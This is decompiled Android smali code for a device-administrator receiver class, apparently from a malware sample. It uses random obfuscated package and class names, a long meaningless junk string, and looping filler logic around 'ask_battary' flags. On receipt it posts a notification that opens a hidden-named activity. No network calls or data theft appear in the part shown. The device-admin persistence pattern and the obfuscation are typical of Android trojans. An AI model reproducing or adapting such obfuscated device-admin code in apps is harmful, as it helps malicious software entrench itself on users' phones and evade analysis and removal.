.class public L[EAGLE3_PACK3]/AdminReceiver;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "AdminReceiver.java"


# static fields
.field private static final NOTIFICATION_ID:I = 0xbc18


# instance fields
.field T2:Ljava/lang/String;

.field T3:Ljava/lang/String;

.field T4:Ljava/lang/String;

.field T5:Ljava/lang/String;

.field will_ask_battary_2:Ljava/lang/Boolean;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 18
    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    const-string v0, "krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55"

    .line 19
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T2:Ljava/lang/String;

    .line 20
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T3:Ljava/lang/String;

    .line 21
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T4:Ljava/lang/String;

    .line 22
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T5:Ljava/lang/String;

    const/4 v0, 0x0

    .line 24
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    return-void
.end method

.method private getmet2(I)Ljava/lang/String;
    .locals 0

    const-string p1, "krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55"

    return-object p1
.end method


# virtual methods
.method public onPasswordSucceeded(Landroid/content/Context;Landroid/content/Intent;Landroid/os/UserHandle;)V
    .locals 0

    .line 145
    invoke-super {p0, p1, p2, p3}, Landroid/app/admin/DeviceAdminReceiver;->onPasswordSucceeded(Landroid/content/Context;Landroid/content/Intent;Landroid/os/UserHandle;)V

    return-void
.end method

.method public onProfileProvisioningComplete(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 27
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onProfileProvisioningComplete(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5

    .line 32
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V

    .line 43
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    const/4 v2, 0x0

    .line 78
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    if-lt v0, v1, :cond_1

    .line 48
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    return-void

    .line 51
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/flyActivity;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    .line 52
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 56
    invoke-static {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->getInstance(Landroid/content/Context;)L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;

    move-result-object v1

    .line 57
    invoke-virtual {v1, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/NotificationUtils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object v1

    const/high16 v4, 0xc000000

    .line 59
    invoke-static {p1, v2, v0, v4}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, v1, Landroid/app/Notification;->contentIntent:Landroid/app/PendingIntent;

    .line 61
    iget v0, v1, Landroid/app/Notification;->flags:I

    or-int/lit8 v0, v0, 0x10

    iput v0, v1, Landroid/app/Notification;->flags:I

    .line 62
    const-class v0, Landroid/app/NotificationManager;

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/NotificationManager;

    const v0, 0xbc18

    .line 63
    invoke-virtual {p1, v0, v1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    :cond_1
    const/4 p1, 0x0

    .line 66
    invoke-virtual {p2, p1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_9

    const/16 p1, 0x37

    .line 67
    invoke-direct {p0, p1}, L[EAGLE3_PACK3]/AdminReceiver;->getmet2(I)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->T2:Ljava/lang/String;

    .line 68
    invoke-direct {p0, p1}, L[EAGLE3_PACK3]/AdminReceiver;->getmet2(I)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->T3:Ljava/lang/String;

    .line 69
    invoke-direct {p0, p1}, L[EAGLE3_PACK3]/AdminReceiver;->getmet2(I)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->T4:Ljava/lang/String;

    .line 70
    invoke-direct {p0, p1}, L[EAGLE3_PACK3]/AdminReceiver;->getmet2(I)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, L[EAGLE3_PACK3]/AdminReceiver;->T5:Ljava/lang/String;

    const/4 p1, 0x1

    .line 71
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    .line 72
    :goto_0
    iget-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    const-string v0, "ask_battary"

    const-string v1, "krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55"

    if-eqz p2, :cond_3

    .line 75
    iget-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->T2:Ljava/lang/String;

    invoke-virtual {p2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_2

    .line 77
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T2:Ljava/lang/String;

    .line 78
    iput-object v3, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_0

    .line 84
    :cond_2
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_0

    .line 87
    :cond_3
    :goto_1
    iget-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_5

    .line 89
    iput-object v1, p0, L[EAGLE3_PACK3]/AdminReceiver;->T3:Ljava/lang/String;

    .line 90
    invoke-virtual {v1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_4

    .line 92
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T3:Ljava/lang/String;

    .line 93
    iput-object v3, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_1

    .line 99
    :cond_4
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_1

    .line 102
    :cond_5
    :goto_2
    iget-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_7

    .line 104
    iput-object v1, p0, L[EAGLE3_PACK3]/AdminReceiver;->T4:Ljava/lang/String;

    .line 105
    invoke-virtual {v1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_6

    .line 107
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T4:Ljava/lang/String;

    .line 108
    iput-object v3, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_2

    .line 114
    :cond_6
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_2

    .line 117
    :cond_7
    :goto_3
    iget-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_9

    .line 119
    iput-object v1, p0, L[EAGLE3_PACK3]/AdminReceiver;->T5:Ljava/lang/String;

    .line 120
    invoke-virtual {v1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_8

    .line 122
    iput-object v0, p0, L[EAGLE3_PACK3]/AdminReceiver;->T5:Ljava/lang/String;

    .line 123
    iput-object v3, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_3

    .line 129
    :cond_8
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, L[EAGLE3_PACK3]/AdminReceiver;->will_ask_battary_2:Ljava/lang/Boolean;

    goto :goto_3

    :cond_9
    return-void
.end method
